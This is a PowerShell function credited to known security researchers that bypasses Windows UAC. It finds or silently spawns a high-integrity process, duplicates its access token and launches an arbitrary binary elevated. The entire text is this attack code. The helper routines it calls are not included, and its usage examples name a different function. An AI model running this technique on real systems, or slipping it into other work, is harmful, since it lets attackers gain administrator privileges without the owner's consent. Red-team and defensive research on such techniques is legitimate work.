function Invoke-BypassUACTokenManipulation {
<#
    .SYNOPSIS
        Bypasses UAC by Duplicating a HI security access token and calling CreateProcessWithLogonW() 
        Author: Matt Nelson (@enigma0x3), James Forshaw (@tiraniddo) and Ruben Boonen (@fuzzySec)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
    .DESCRIPTION
       This function will enumerate the process listing for any processes that have a HI security access token.
       If one is identified, it will Duplicate that token, apply it to the current thread and then call
       CreateProcessWithLogonW() to start a new process with that HI security access token. If a HI token is not 
       found, the function will start one via the "RunAs" verb for TaskMgr.exe, loop the process list again and 
       Duplicate any newly found HI security access tokens.

    .PARAMETER Binary
       Should exist in System32. If it doesn't, modify the path.

    .PARAMETER Arguments
       Any arguments that follow the binary entered.

    .PARAMETER ProcID
       Process ID of a proc with a HI security access token applied. This will use a specified process
       instead of looping the process list.

    .EXAMPLE
        Invoke-TokenDuplication -Binary "cmd.exe" -Arguments "/c calc.exe" -Verbose
        Loops the proccess list, duplicates a HI token and starts cmd.exe /c calc.exe with that token.

    .EXAMPLE
        Invoke-TokenDuplication -Binary "cmd.exe" -Arguments "/c calc.exe" -ProcID 1128 -Verbose
        Uses Process ID 1128 to duplicate the token and start cmd.exe /c calc.exe with that token.

    .LINK
    https://tyranidslair.blogspot.com/2017/05/reading-your-way-around-uac-part-1.html
    https://tyranidslair.blogspot.com/2017/05/reading-your-way-around-uac-part-2.html
    https://tyranidslair.blogspot.com/2017/05/reading-your-way-around-uac-part-3.html
    https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1
#>
param(
        [Parameter(Mandatory = $False)]
        [String]$Binary,
        [Parameter(Mandatory = $False)]
        [String]$Arguments,
        [Parameter(Mandatory = $False)]
        [int]$ProcID
    )


    if(!$ProcID){
        $VerbosePreference = "continue"
        Write-Verbose "Enumerating Process list..."
        $HIProc = @(EnumProcesses)
        if($HIProc.count -eq 0){
            Write-Verbose "No HI process available, starting one..."
            $StartInfo = New-Object Diagnostics.ProcessStartInfo
            $StartInfo.FileName = "TaskMgr.exe"
            $StartInfo.UseShellExecute = $true
            $StartInfo.Verb = "runas"
            $Startinfo.WindowStyle = 'Hidden'
            $Startinfo.CreateNoWindow = $True
            $Process = New-Object Diagnostics.Process
            $Process.StartInfo = $StartInfo
            $null = $Process.Start()
            Write-Verbose "Enumerating Process list again..."
            $HIProc = EnumProcesses
            Write-Verbose "HI Process found. PID: $HIProc"
            Write-Verbose "DuplicatingToken from $HIProc"
            Write-Verbose $Binary
            $null = ElevateProcess $HIProc $Binary $Arguments
            Write-Verbose "Sleeping 5 seconds..."
            Start-sleep 5
            Write-Verbose "Killing the newly created process"
            $null = $Kernel32::TerminateProcess($Process.Handle,1)
        }else{
            Write-Verbose "HI Proc found. ID: $HIProc"
            ElevateProcess $HIProc $Binary $Arguments
        }
    }else{
        Write-Verbose "Elevating $ProcID"
        ElevateProcess $ProcID $Binary $Arguments
    }
    
    
}